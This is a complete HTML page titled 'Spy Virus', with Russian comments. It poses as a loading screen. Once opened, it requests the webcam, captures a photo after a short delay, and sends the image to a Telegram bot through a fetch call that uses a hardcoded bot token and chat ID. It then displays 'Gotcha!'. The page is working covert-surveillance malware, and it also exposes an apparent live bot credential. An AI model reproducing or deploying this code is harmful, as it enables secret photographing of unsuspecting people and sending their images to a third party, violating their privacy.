<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Virus</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #2c3e50; 
            color: white; 
            font-family: sans-serif;
            margin: 0;
        }
        h1 {
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1 id="status">Загрузка...</h1>

    <script>
        async function takePhoto() {
            const statusText = document.getElementById('status');
            
            try {
                // 1. Запрашиваем доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.srcObject = stream;

                // 2. Ждем, пока видео "прогрузится" (1 секунда)
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        // 3. Получаем данные картинки
                        const dataUrl = canvas.toDataURL('image/png');
                        
                        // ТВОИ ДАННЫЕ (уже вставлены):
                        const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
                        const chatId = "1062964951";

                        // 4. ОТПРАВКА (используем encodeURIComponent для надежности)
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(dataUrl)}`)
                            .then(response => {
                                if (response.ok) {
                                    statusText.innerText = "ПОПАЛСЯ! 📸";
                                } else {
                                    // Если всё равно ошибка, покажем код ошибки в консоли
                                    statusText.innerText = "Ошибка отправки!";
                                    console.log("Ответ сервера:", response.status);
                                }
                            })
                            .catch(err => {
                                statusText.innerText = "Ошибка сети!";
                                console.error(err);
                            });

                        // 5. Выключаем камеру
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch (err) {
                console.error("Ошибка:", err);
                statusText.innerText = "Ой, камера не включилась!";
            }
        }

        // Запуск через полсекунды после открытия страницы
        setTimeout(takePhoto, 500);
    </script>
</body>
</html>
